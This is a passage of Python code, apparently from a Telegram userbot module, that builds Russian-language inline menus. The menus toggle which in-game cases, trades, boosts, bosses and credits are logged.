                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )

    async def idk(self,call:InlineCall):
        self.set('dk', not self.get('dk'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def ikr(self, call: InlineCall):
        self.set('kr', not self.get('kr'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def izv(self, call: InlineCall):
        self.set('zv', not self.get('zv'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )

    async def idk(self,call:InlineCall):
        self.set('dk', not self.get('dk'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )

    async def itrade(self, call: InlineCall):

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''
        await call.edit(
                text=f"<b>Трейды:</b>\n{tradee}{tradeii}",
                reply_markup=[
                    [
                        {
                            "text" : "📦 Кейсы",
                            "callback" : self.itcase,
                        },
                        {
                            "text" : "🪄 Предметы",
                            "callback" : self.ititem,
                        }
                    ],
                    [
                        {
                            "text": "🔙 Назад",
                            "callback": self.iback,
                        }
                    ],
                ],
          )   

    async def itcase(self, call: InlineCall):
        self.set("tradec", not self.get('tradec'))
        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''
        await call.edit(
                text=f"<b>Трейды:</b>\n{tradee}{tradeii}",
                reply_markup=[
                    [
                        {
                            "text" : "📦 Кейсы",
                            "callback" : self.itcase,
                        },
                        {
                            "text" : "🪄 Предметы",
                            "callback" : self.ititem,
                        }
                    ],
                    [
                        {
                            "text": "🔙 Назад",
                            "callback": self.iback,
                        }
                    ],
                ]
        )

    async def ititem(self, call: InlineCall):
        self.set("tradei", not self.get('tradei'))
        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''
        await call.edit(
                text=f"<b>Трейды:</b>\n{tradee}{tradeii}",
                reply_markup=[
                    [
                        {
                            "text" : "📦 Кейсы",
                            "callback" : self.itcase,
                        },
                        {
                            "text" : "🪄 Предметы",
                            "callback" : self.ititem, 
                        }
                    ],
                    [
                        {
                            "text": "🔙 Назад",
                            "callback": self.iback,
                        }
                    ],
                ]
        )

    async def iboss(self, call: InlineCall):
        self.set('bosses', not self.get('bosses'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""

        if self.get('credits'):
            crd = ' ▫️<i> 💳 Кредиты</i>\n'
        else:
            crd = ''

        if self.get('boosters'):
            bosst = ' ▫️<i> ⚡️ Бусты </i>\n'
        else:
            bosst = ""

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''

        if self.get('bosses'):
            bosss = ' ▫️<i> 🗡 Боссы </i>\n'
        else:
            bosss = ''
        await call.edit(
                text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}\n<b>Трейды:</b>\n{tradee}{tradeii}\n<b>Ресурсы:</b>\n{crd}{bosst}{bosss}",
                reply_markup=[
                        [
                            {
                                "text": "📦 Кейсы",
                                "callback": self.icases,
                            },
                            {
                                "text" : "⚡️ Бусты",
                                "callback" : self.iboost,
                            },
                            {
                                "text" : "♻️ Трейды",
                                "callback" : self.itrade,
                            },
                    ],
                    [
                            {
                                "text": "🗡 Боссы",
                                "callback": self.iboss,
                            },
                            {
                                'text' : "💳 Кредиты",
                                'callback' : self.icrd,
                            },
                    ],
                    [
                            {
                                "text": "🔻 Закрыть",
                                "action" : "close",
                            }
                    ],
                ],
          )   

    async def iboost(self, call: InlineCall):
        self.set('boosters', not self.get('boosters'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""

        if self.get('credits'):
            crd = ' ▫️<i> 💳 Кредиты</i>\n'
        else:
            crd = ''

        if self.get('boosters'):
            bosst = ' ▫️<i> ⚡️ Бусты </i>\n'
        else:
            bosst = ""

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''

        if self.get('bosses'):
            bosss = ' ▫️<i> 🗡 Боссы </i>\n'
        else:
            bosss = ''
        await call.edit(
                text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}\n<b>Трейды:</b>\n{tradee}{tradeii}\n<b>Ресурсы:</b>\n{crd}{bosst}{bosss}",
                reply_markup=[
                        [
                            {
                                "text": "📦 Кейсы",
                                "callback": self.icases,
                            },
                            {
                                "text" : "⚡️ Бусты",
                                "callback" : self.iboost,
                            },
                            {
                                "text" : "♻️ Трейды",
                                "callback" : self.itrade,
                            },
                    ],
                    [
                            {
                                "text": "🗡 Боссы",
                                "callback": self.iboss,
                            },
                            {
                                'text' : "💳 Кредиты",
                                'callback' : self.icrd,
                            },
                    ],
                    [
                            {
                                "text": "🔻 Закрыть",
                                "action" : "close",
                            }
                    ],
                ],
          )   
    async def iback(self, call: InlineCall):
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""

        if self.get('credits'):
            crd = ' ▫️<i> 💳 Кредиты</i>\n'
        else:
            crd = ''

        if self.get('boosters'):
            bosst = ' ▫️<i> ⚡️ Бусты </i>\n'
        else:
            bosst = ""

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''

        if self.get('bosses'):
            bosss = ' ▫️<i> 🗡 Боссы </i>\n'
        else:
            bosss = ''
        await call.edit(
                text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}\n<b>Трейды:</b>\n{tradee}{tradeii}\n<b>Ресурсы:</b>\n{crd}{bosst}{bosss}",
                reply_markup=[
                        [
                            {
                                "text": "📦 Кейсы",
                                "callback": self.icases,
                            },
                            {
                                "text" : "⚡️ Бусты",
                                "callback" : self.iboost,
                            },
                            {
                                "text" : "♻️ Трейды",
                                "callback" : self.itrade,
                            },
                    ],
                    [
                            {
                                "text": "🗡 Боссы",
                                "callback": self.iboss,
                            },
                            {
                                'text' : "💳 Кредиты",
                                'callback' : self.icrd,
                            },
                    ],
                    [
                            {
                                "text": "🔻 Закрыть",
                                "action" : "close",
                            }
                    ],
                ],
          )   
              